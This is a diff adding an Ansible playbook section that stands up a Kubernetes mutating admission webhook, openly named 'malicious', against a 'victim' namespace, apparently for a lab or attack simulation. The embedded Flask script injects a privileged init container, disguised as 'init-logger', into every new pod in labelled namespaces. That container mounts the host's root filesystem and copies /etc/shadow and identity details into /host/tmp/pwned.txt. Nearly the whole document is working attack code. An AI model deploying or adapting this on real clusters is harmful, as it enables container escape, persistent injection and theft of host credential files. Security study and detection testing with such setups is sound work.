@@ -1,0 +1,218 @@
+- name: Generate self-signed TLS cert for malicious webhook
+  become: true
+  become_user: "{{ microk8s_user }}"
+  ansible.builtin.shell:
+    cmd: |
+      openssl req -x509 -newkey rsa:2048 \
+        -keyout /home/{{ microk8s_user }}/webhook-key.pem \
+        -out /home/{{ microk8s_user }}/webhook-cert.pem \
+        -days 365 -nodes \
+        -subj "/CN=malicious-webhook.default.svc" \
+        -addext "subjectAltName=DNS:malicious-webhook.default.svc,DNS:malicious-webhook.default.svc.cluster.local"
+  changed_when: true
+
+- name: Create TLS secret for malicious webhook
+  become: true
+  become_user: "{{ microk8s_user }}"
+  ansible.builtin.shell:
+    cmd: |
+      microk8s kubectl create secret tls malicious-webhook-tls \
+        --cert=/home/{{ microk8s_user }}/webhook-cert.pem \
+        --key=/home/{{ microk8s_user }}/webhook-key.pem \
+        --namespace=default \
+        --dry-run=client -o yaml | microk8s kubectl apply -f -
+  changed_when: true
+
+- name: Read CA bundle for webhook config
+  become: true
+  become_user: "{{ microk8s_user }}"
+  ansible.builtin.shell:
+    cmd: base64 -w 0 /home/{{ microk8s_user }}/webhook-cert.pem
+  register: ca_bundle
+  changed_when: false
+
+- name: Create ConfigMap with webhook server script
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: ConfigMap
+      metadata:
+        name: malicious-webhook-script
+        namespace: default
+      data:
+        webhook.py: |
+          from flask import Flask, request, jsonify
+          import base64, json
+
+          app = Flask(__name__)
+
+          @app.route('/healthz', methods=['GET'])
+          def healthz():
+              return 'ok', 200
+
+          @app.route('/mutate', methods=['POST'])
+          def mutate():
+              review = request.get_json()
+              uid = review['request']['uid']
+              spec = review['request'].get('object', {}).get('spec', {})
+
+              patch = []
+
+              if 'initContainers' not in spec:
+                  patch.append({"op": "add", "path": "/spec/initContainers", "value": []})
+
+              patch.append({
+                  "op": "add",
+                  "path": "/spec/initContainers/-",
+                  "value": {
+                      "name": "init-logger",
+                      "image": "alpine:latest",
+                      "imagePullPolicy": "IfNotPresent",
+                      "command": ["/bin/sh", "-c",
+                          "id > /host/tmp/pwned.txt && hostname >> /host/tmp/pwned.txt && cat /host/etc/shadow >> /host/tmp/pwned.txt"],
+                      "securityContext": {"privileged": True},
+                      "volumeMounts": [{"name": "host-root", "mountPath": "/host"}]
+                  }
+              })
+
+              if 'volumes' not in spec:
+                  patch.append({"op": "add", "path": "/spec/volumes", "value": []})
+
+              patch.append({
+                  "op": "add",
+                  "path": "/spec/volumes/-",
+                  "value": {"name": "host-root", "hostPath": {"path": "/"}}
+              })
+
+              return jsonify({
+                  "apiVersion": "admission.k8s.io/v1",
+                  "kind": "AdmissionReview",
+                  "response": {
+                      "uid": uid,
+                      "allowed": True,
+                      "patchType": "JSONPatch",
+                      "patch": base64.b64encode(json.dumps(patch).encode()).decode()
+                  }
+              })
+
+          if __name__ == '__main__':
+              app.run(host='0.0.0.0', port=8443,
+                      ssl_context=('/certs/tls.crt', '/certs/tls.key'))
+
+- name: Delete malicious webhook pod if it exists
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: absent
+    api_version: v1
+    kind: Pod
+    name: malicious-webhook
+    namespace: default
+    wait: true
+
+- name: Deploy malicious webhook server
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: malicious-webhook
+        namespace: default
+        labels:
+          app: malicious-webhook
+      spec:
+        containers:
+          - name: webhook
+            image: python:3.11-alpine
+            command: ["/bin/sh", "-c", "pip install flask --quiet && python /webhook/webhook.py"]
+            ports:
+              - containerPort: 8443
+            readinessProbe:
+              httpGet:
+                path: /healthz
+                port: 8443
+                scheme: HTTPS
+              initialDelaySeconds: 30
+              periodSeconds: 5
+              failureThreshold: 10
+            volumeMounts:
+              - name: script
+                mountPath: /webhook
+              - name: tls
+                mountPath: /certs
+        volumes:
+          - name: script
+            configMap:
+              name: malicious-webhook-script
+          - name: tls
+            secret:
+              secretName: malicious-webhook-tls
+
+- name: Create Service for malicious webhook
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Service
+      metadata:
+        name: malicious-webhook
+        namespace: default
+      spec:
+        selector:
+          app: malicious-webhook
+        ports:
+          - port: 443
+            targetPort: 8443
+
+- name: Create victim namespace (target for injection)
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: v1
+      kind: Namespace
+      metadata:
+        name: victim
+        labels:
+          webhook: enabled
+          environment: victim
+
+- name: Wait for malicious webhook pod to be ready
+  ansible.builtin.command:
+    cmd: microk8s kubectl wait pod/malicious-webhook -n default --for=condition=Ready --timeout=120s
+  changed_when: false
+  become: true
+  become_user: "{{ microk8s_user }}"
+
+- name: Register MutatingWebhookConfiguration
+  kubernetes.core.k8s:
+    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
+    state: present
+    definition:
+      apiVersion: admissionregistration.k8s.io/v1
+      kind: MutatingWebhookConfiguration
+      metadata:
+        name: malicious-injector
+      webhooks:
+        - name: inject.malicious.io
+          admissionReviewVersions: ["v1"]
+          sideEffects: None
+          failurePolicy: Ignore
+          clientConfig:
+            service:
+              name: malicious-webhook
+              namespace: default
+              path: /mutate
+            caBundle: "{{ ca_bundle.stdout }}"
+          rules:
+            - operations: ["CREATE"]
+              apiGroups: [""]
+              apiVersions: ["v1"]
+              resources: ["pods"]
+          namespaceSelector:
+            matchLabels:
+              webhook: enabled
